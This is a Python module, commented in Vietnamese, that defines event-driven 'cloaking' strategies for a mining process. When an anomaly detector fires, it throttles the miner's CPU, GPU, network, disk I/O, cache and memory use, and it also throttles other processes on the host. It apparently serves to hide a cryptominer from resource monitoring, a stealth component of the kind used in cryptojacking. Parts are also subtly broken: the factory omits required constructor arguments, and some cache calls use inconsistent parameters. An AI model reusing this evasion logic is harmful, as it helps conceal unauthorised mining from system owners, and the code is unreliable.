# cloak_strategies.py

import os
import logging
import subprocess
import psutil
import pynvml
import traceback
import asyncio
from abc import ABC, abstractmethod
from typing import Dict, Any, List, Tuple, Optional, Type
from typing import TYPE_CHECKING

from .utils import MiningProcess

  
if TYPE_CHECKING:
    from .resource_control import (
        CPUResourceManager,
        GPUResourceManager,
        NetworkResourceManager,
        DiskIOResourceManager,
        CacheResourceManager,
        MemoryResourceManager
    )

###############################################################################
#                 LỚP CƠ SỞ: CloakStrategy (HƯỚNG SỰ KIỆN - EVENT-DRIVEN)    #
###############################################################################

class CloakStrategy(ABC):
    """
    Lớp cơ sở cho các chiến lược cloaking.

    Trong mô hình event-driven, các phương thức apply() và restore() sẽ được
    'gọi' (trigger) bởi ResourceManager/AnomalyDetector khi có sự kiện cần
    áp dụng hoặc khôi phục cloaking. Mỗi chiến lược chịu trách nhiệm xử lý
    logic cloaking đặc thù cho loại tài nguyên tương ứng.
    """

    @abstractmethod
    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking (bất đồng bộ) cho tiến trình đã cho.
        Gọi khi có sự kiện 'cloaking' xảy ra.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        pass

    @abstractmethod
    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cấu hình ban đầu (bất đồng bộ) cho tiến trình đã cho.
        Gọi khi có sự kiện 'restore' xảy ra.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        pass


###############################################################################
#                 CPU STRATEGY: CpuCloakStrategy (EVENT-DRIVEN)               #
###############################################################################

class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU:
      - Giới hạn CPU bằng cgroups.
      - Tối ưu cache CPU.
      - Đặt affinity cho các core cụ thể.
      - Hạn chế CPU cho tiến trình bên ngoài.
      - Khôi phục cài đặt gốc khi không cần cloaking.
      - Đảm bảo tương thích với mô hình async/event-driven.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cpu_resource_manager: 'CPUResourceManager' ):
        """
        Khởi tạo CpuCloakStrategy với cấu hình và logger.

        - self.throttle_percentage: Mức độ "giảm" CPU (%).
        - self.throttle_external_percentage: Mức độ "giảm" CPU cho tiến trình khác.
        - self.exempt_pids: DS PID ngoại lệ không bị giảm.
        - self.target_cores: Nếu không None, tiến trình bị giới hạn affinity lên các core cụ thể.

        Args:
            config (Dict[str, Any]): Cấu hình cho cloaking CPU.
            logger (logging.Logger): Logger để ghi log.
        """
        self.logger = logger

        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
            logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
            self.throttle_external_percentage = 30

        self.exempt_pids = config.get('exempt_pids', [])
        self.target_cores = config.get('target_cores', None)

        # Lưu tên cgroup cho từng PID (nếu cần sau này).
        self.process_cgroup: Dict[int, str] = {}

        # Khởi tạo ResourceManager cụ thể
        self.cpu_resource_manager = cpu_resource_manager

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking CPU (event-driven): 
        - Tạo cgroup và giới hạn CPU usage,
        - Tối ưu cache,
        - Đặt CPU affinity,
        - Hạn chế tiến trình bên ngoài.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Dùng asyncio.to_thread để tránh block event loop
            cgroup_name = await asyncio.to_thread(
                self.cpu_resource_manager.throttle_cpu_usage,
                pid,
                self.throttle_percentage
            )
            if cgroup_name:
                self.process_cgroup[pid] = cgroup_name
                self.logger.info(
                    f"[CPU Cloaking] Giới hạn CPU {self.throttle_percentage}% cho {process_name} (PID={pid})."
                )
            else:
                self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {process_name} (PID={pid}).")
                return

            success_optimize_cache = await asyncio.to_thread(
                self.cpu_resource_manager.optimize_cache_usage,
                pid
            )
            if success_optimize_cache:
                self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {process_name} (PID={pid}).")

            success_affinity = await asyncio.to_thread(
                self.cpu_resource_manager.optimize_thread_scheduling,
                pid,
                self.target_cores
            )
            if success_affinity:
                self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {process_name} (PID={pid}).")

            success_limit_external = await asyncio.to_thread(
                self.cpu_resource_manager.limit_cpu_for_external_processes,
                [pid] + self.exempt_pids,
                self.throttle_external_percentage
            )
            if success_limit_external:
                self.logger.info(f"[CPU Cloaking] Hạn chế CPU cho tiến trình bên ngoài (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking CPU cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking CPU cho tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt CPU (event-driven): 
        - Xoá cgroup,
        - Bỏ giới hạn CPU cho tiến trình bên ngoài.
        """
        try:
            pid, process_name = self.get_process_info(process)

            cgroup_name = self.process_cgroup.get(pid)
            if cgroup_name:
                success_restore = await asyncio.to_thread(
                    self.cpu_resource_manager.restore_cpu_settings,
                    cgroup_name
                )
                if success_restore:
                    self.logger.info(f"[CPU Restore] Khôi phục cgroup CPU cho {process_name} (PID={pid}).")
                else:
                    self.logger.error(f"[CPU Restore] Không thể khôi phục cgroup CPU cho {process_name} (PID={pid}).")
                del self.process_cgroup[pid]

            # Gỡ bỏ hạn chế CPU cho tiến trình bên ngoài
            success_unlimit_external = await asyncio.to_thread(
                self.cpu_resource_manager.limit_cpu_for_external_processes,
                [pid] + self.exempt_pids,
                0  # 0% => bỏ hạn chế
            )
            if success_unlimit_external:
                self.logger.info("[CPU Restore] Đã huỷ giới hạn CPU cho tiến trình bên ngoài.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục CPU cho tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """Trích xuất PID và tên tiến trình."""
        return process.pid, process.name


###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy (EVENT-DRIVEN)               #
###############################################################################

class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU:
      - Giới hạn power limit,
      - Thiết lập xung nhịp SM, memory,
      - Giới hạn nhiệt độ, tăng fan nếu hỗ trợ,
      - Khôi phục cài đặt gốc khi không cần cloaking.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_resource_manager: 'GPUResourceManager'):
        self.logger = logger

        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
        self.target_mem_clock = config.get('mem_clock', 800)  # MHz

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if not isinstance(self.temperature_threshold, (int, float)) or self.temperature_threshold <= 0:
            logger.warning("Giá trị temperature_threshold không hợp lệ, mặc định 80°C.")
            self.temperature_threshold = 80

        self.fan_speed_increase = config.get('fan_speed_increase', 20)
        if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
            logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
            self.fan_speed_increase = 20
 
        self.gpu_resource_manager = gpu_resource_manager

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking GPU (event-driven):
          - Giới hạn power limit,
          - Điều chỉnh clock,
          - Giới hạn nhiệt độ (nếu cần).
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Gán GPU cho tiến trình (vd. theo PID)
            gpu_indices = await asyncio.to_thread(self.assign_gpus, pid)
            if not gpu_indices:
                self.logger.warning(f"[GPU Cloaking] Không thể gán GPU cho {process_name} (PID={pid}).")
                return

            for gpu_index in gpu_indices:
                desired_power_limit = self.calculate_desired_power_limit(gpu_index)
                success_power = await asyncio.to_thread(
                    self.gpu_resource_manager.set_gpu_power_limit,
                    pid,
                    gpu_index,
                    desired_power_limit
                )
                if success_power:
                    self.logger.info(f"[GPU Cloaking] Đặt power limit={desired_power_limit}W, GPU={gpu_index}, PID={pid}.")

                success_clocks = await asyncio.to_thread(
                    self.gpu_resource_manager.set_gpu_clocks,
                    pid,
                    gpu_index,
                    self.target_sm_clock,
                    self.target_mem_clock
                )
                if success_clocks:
                    self.logger.info(f"[GPU Cloaking] Đặt SM={self.target_sm_clock}MHz / MEM={self.target_mem_clock}MHz cho GPU={gpu_index}, PID={pid}.")

                success_temp = await asyncio.to_thread(
                    self.gpu_resource_manager.limit_temperature,
                    gpu_index,
                    self.temperature_threshold,
                    self.fan_speed_increase
                )
                if success_temp:
                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ GPU={gpu_index}, PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt GPU (event-driven):
          - Gỡ bỏ các giới hạn power, clock v.v.
        """
        try:
            pid, process_name = self.get_process_info(process)

            success_restore = await asyncio.to_thread(
                self.gpu_resource_manager.restore_resources,
                pid
            )
            if success_restore:
                self.logger.info(f"[GPU Restore] Đã khôi phục thiết lập GPU cho {process_name} (PID={pid}).")
            else:
                self.logger.error(f"[GPU Restore] Không thể khôi phục GPU cho {process_name} (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục GPU cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_desired_power_limit(self, gpu_index: int) -> int:
        """
        Tính toán power limit mới dựa trên throttle_percentage.
        """
        current_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index) or 100
        desired = int(round(current_limit * (1 - self.throttle_percentage / 100)))
        self.logger.debug(f"Tính toán power limit mới GPU={gpu_index}: {desired}W.")
        return desired

    def assign_gpus(self, pid: int) -> List[int]:
        """
        Gán GPU cho PID. Ở đây ví dụ gán toàn bộ GPU sẵn có.
        """
        gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
        if gpu_count <= 0:
            return []
        assigned = list(range(gpu_count))
        self.logger.debug(f"[GPU Cloaking] Gán GPU {assigned} cho PID={pid}.")
        return assigned

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        return process.pid, process.name


###############################################################################
#              NETWORK STRATEGY: NetworkCloakStrategy (EVENT-DRIVEN)          #
###############################################################################

class NetworkCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking mạng:
      - Giảm băng thông cho PID (iptables + tc),
      - Khôi phục cài đặt ban đầu khi không cần cloaking.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, network_resource_manager: 'NetworkResourceManager'):
        self.logger = logger

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if not isinstance(self.bandwidth_reduction_mbps, (int, float)) or self.bandwidth_reduction_mbps <= 0:
            logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định 10Mbps.")
            self.bandwidth_reduction_mbps = 10

        self.network_interface = config.get('network_interface')
        if not self.network_interface:
            # Tự động xác định
            self.network_interface = self.get_primary_network_interface() or "eth0"

        self.network_resource_manager = network_resource_manager
        self.process_marks: Dict[int, int] = {}

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking mạng (event-driven):
         - Thêm iptables mark,
         - Giới hạn băng thông qua tc.
        """
        try:
            pid, process_name = self.get_process_info(process)

            mark = pid % 32768
            success_mark = await asyncio.to_thread(
                self.network_resource_manager.mark_packets,
                pid,
                mark
            )
            if not success_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}, mark={mark}.")
                return

            success_limit = await asyncio.to_thread(
                self.network_resource_manager.limit_bandwidth,
                self.network_interface,
                mark,
                self.bandwidth_reduction_mbps
            )
            if not success_limit:
                self.logger.error(f"[Net Cloaking] Không thể giới hạn băng thông, mark={mark}, iface={self.network_interface}.")
                return

            self.process_marks[pid] = mark
            self.logger.info(
                f"[Net Cloaking] Giới hạn {self.bandwidth_reduction_mbps}Mbps cho {process_name} (PID={pid}), iface={self.network_interface}, mark={mark}."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền cloaking mạng cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục băng thông (event-driven):
         - Gỡ bỏ giới hạn tc,
         - Xoá iptables mark.
        """
        try:
            pid, process_name = self.get_process_info(process)

            mark = self.process_marks.get(pid)
            if mark is None:
                self.logger.warning(f"[Net Restore] Không tìm thấy fwmark cho PID={pid}.")
                return

            success_remove = await asyncio.to_thread(
                self.network_resource_manager.remove_bandwidth_limit,
                self.network_interface,
                mark
            )
            if success_remove:
                self.logger.info(f"[Net Restore] Khôi phục băng thông cho {process_name} (PID={pid}).")

            success_unmark = await asyncio.to_thread(
                self.network_resource_manager.unmark_packets,
                pid,
                mark
            )
            if success_unmark:
                self.logger.info(f"[Net Restore] Xoá MARK iptables cho {process_name} (PID={pid}).")

            if pid in self.process_marks:
                del self.process_marks[pid]

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục cloaking mạng cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục mạng cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_primary_network_interface(self) -> Optional[str]:
        """Tự động xác định giao diện mạng chính."""
        try:
            for iface, addr_list in psutil.net_if_addrs().items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK:
                        return iface
            return None
        except Exception as e:
            self.logger.error(f"Lỗi xác định giao diện mạng: {e}")
            return None

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        return process.pid, process.name


###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy (EVENT-DRIVEN)             #
###############################################################################

class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Disk I/O:
      - Giới hạn I/O weight qua cgroups hoặc ionice,
      - Khôi phục khi không cần cloaking.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, disk_io_resource_manager: 'DiskIOResourceManager'):
        self.logger = logger

        self.io_weight = config.get('io_weight', 500)
        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
            logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định 500.")
            self.io_weight = 500

        self.disk_io_resource_manager = disk_io_resource_manager

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Disk I/O (event-driven):
         - Đặt I/O weight (cgroups hoặc ionice).
        """
        try:
            pid, process_name = self.get_process_info(process)

            success = await asyncio.to_thread(
                self.disk_io_resource_manager.set_io_weight,
                pid,
                self.io_weight
            )
            if success:
                self.logger.info(f"[DiskIO Cloaking] Đặt io_weight={self.io_weight} cho {process_name} (PID={pid}).")
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể đặt io_weight={self.io_weight} cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền cloaking Disk I/O cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Disk I/O cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt I/O (event-driven):
         - Đặt lại io_weight = 1000 (hoặc giá trị tối đa).
        """
        try:
            pid, process_name = self.get_process_info(process)

            success = await asyncio.to_thread(
                self.disk_io_resource_manager.set_io_weight,
                pid,
                1000
            )
            if success:
                self.logger.info(f"[DiskIO Restore] Đã khôi phục io_weight=1000 cho {process_name} (PID={pid}).")
            else:
                self.logger.error(f"[DiskIO Restore] Không thể khôi phục io_weight cho PID={pid}.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục Disk I/O cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Disk I/O cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        return process.pid, process.name


###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy (EVENT-DRIVEN)                #
###############################################################################

class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Cache:
      - Drop caches,
      - Giới hạn cache usage,
      - Khôi phục cài đặt gốc khi không cần cloaking.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cache_resource_manager: 'CacheResourceManager'):
        self.logger = logger

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            logger.warning(f"cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định 50%.")
            self.cache_limit_percent = 50

        self.cache_resource_manager = cache_resource_manager

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Cache (event-driven):
         - Drop caches hệ thống,
         - Giới hạn cache usage.
        """
        try:
            pid, process_name = self.get_process_info(process)

            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches)
            if success_drop:
                self.logger.info(f"[Cache Cloaking] Drop caches cho {process_name} (PID={pid}).")

            success_limit = await asyncio.to_thread(
                self.cache_resource_manager.limit_cache_usage,
                self.cache_limit_percent
            )
            if success_limit:
                self.logger.info(f"[Cache Cloaking] Giới hạn cache={self.cache_limit_percent}% cho PID={pid}.")

        except PermissionError:
            self.logger.error(
                f"Không đủ quyền drop caches. Cloaking Cache thất bại cho PID={process.pid}."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền cloaking Cache cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Cache cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cache (event-driven):
         - Gỡ giới hạn, đặt cache usage = 100%.
        """
        try:
            pid, process_name = self.get_process_info(process)

            success_limit = await asyncio.to_thread(
                self.cache_resource_manager.limit_cache_usage,
                100
            )
            if success_limit:
                self.logger.info(f"[Cache Restore] Đã khôi phục giới hạn cache=100% cho PID={pid}.")

        except PermissionError:
            self.logger.error(
                f"Không đủ quyền để khôi phục Cache cho PID={process.pid}."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục cloaking Cache cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Cache cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        return process.pid, process.name


###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy (EVENT-DRIVEN)              #
###############################################################################

class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Giới hạn usage (vd. cgroups),
      - Drop caches nếu cần thiết,
      - Khôi phục cài đặt khi không cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: 'MemoryResourceManager',
        cache_resource_manager: 'CacheResourceManager'  # Tiêm CacheResourceManager
    ):
        self.logger = logger

        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            logger.warning(f"memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định 50%.")
            self.memory_limit_percent = 50

        self.memory_resource_manager = memory_resource_manager
        self.cache_resource_manager = cache_resource_manager

    async def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Memory (event-driven):
         - Drop caches,
         - Giới hạn memory usage.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches
            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches, pid)
            if success_drop:
                self.logger.info(f"[Memory Cloaking] Drop caches cho {process_name} (PID={pid}).")

            # Giới hạn memory
            memory_limit_mb = self.calculate_memory_limit_mb()
            success_limit = await asyncio.to_thread(
                self.memory_resource_manager.set_memory_limit,
                pid,
                memory_limit_mb
            )
            if success_limit:
                self.logger.info(
                    f"[Memory Cloaking] Giới hạn {self.memory_limit_percent}% (~{memory_limit_mb}MB) cho PID={pid}."
                )

        except PermissionError:
            self.logger.error(
                f"Không đủ quyền drop caches. Cloaking Memory thất bại cho PID={process.pid}."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền cloaking Memory cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Memory cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục memory (event-driven):
         - Gỡ giới hạn memory,
         - Khôi phục cache usage.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Khôi phục giới hạn memory
            success_restore_memory = await asyncio.to_thread(
                self.memory_resource_manager.restore_resources,
                pid
            )
            if success_restore_memory:
                self.logger.info(f"[Memory Restore] Khôi phục giới hạn memory cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục memory cho PID={pid}.")

            # Khôi phục cache usage về 100%
            success_restore_cache = await asyncio.to_thread(
                self.cache_resource_manager.limit_cache_usage,
                100,
                pid
            )
            if success_restore_cache:
                self.logger.info(f"[Memory Restore] Khôi phục giới hạn cache=100% cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục cache cho PID={pid}.")

            self.logger.info(f"[Memory Restore] Hoàn tất khôi phục Memory cho {process_name} (PID={pid}).")

        except PermissionError:
            self.logger.error(
                f"Không đủ quyền khôi phục cloaking Memory cho PID={process.pid}."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền khôi phục Memory cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Memory cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_memory_limit_mb(self) -> int:
        """Tính giới hạn bộ nhớ (MB) dựa trên memory_limit_percent."""
        total_memory_bytes = psutil.virtual_memory().total
        limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
        limit_mb = int(limit_bytes / (1024 * 1024))
        self.logger.debug(f"[Memory Cloaking] Tính toán memory_limit={limit_mb}MB.")
        return limit_mb

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        return process.pid, process.name


###############################################################################
#         FACTORY: CloakStrategyFactory (TƯƠNG THÍCH EVENT-DRIVEN)            #
###############################################################################

class CloakStrategyFactory:
    """
    Factory để tạo instance chiến lược cloaking.
    Trong mô hình event-driven, ResourceManager/AnomalyDetector sẽ gọi
    create_strategy() khi cần.
    """

    _strategies: Dict[str, Type[CloakStrategy]] = {
        'cpu': CpuCloakStrategy,
        'gpu': GpuCloakStrategy,
        'network': NetworkCloakStrategy,
        'disk_io': DiskIoCloakStrategy,
        'cache': CacheCloakStrategy,
        'memory': MemoryCloakStrategy
    }

    @staticmethod
    async def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger
    ) -> Optional[CloakStrategy]:
        """
        Trả về instance chiến lược cloaking dựa trên tên.

        Args:
            strategy_name (str): Tên của chiến lược cloaking ('cpu','gpu','network',...).
            config (Dict[str, Any]): Cấu hình cloaking.
            logger (logging.Logger): Logger.

        Returns:
            Optional[CloakStrategy]: Instance CloakStrategy hoặc None nếu không tìm thấy.
        """
        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())
        if strategy_class and issubclass(strategy_class, CloakStrategy):
            try:
                # Có thể dùng await asyncio.sleep(0) để tuân thủ async, 
                # nhưng trong constructor thường không cần.
                return strategy_class(config, logger)
            except Exception as e:
                logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
                return None
        else:
            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
            return None
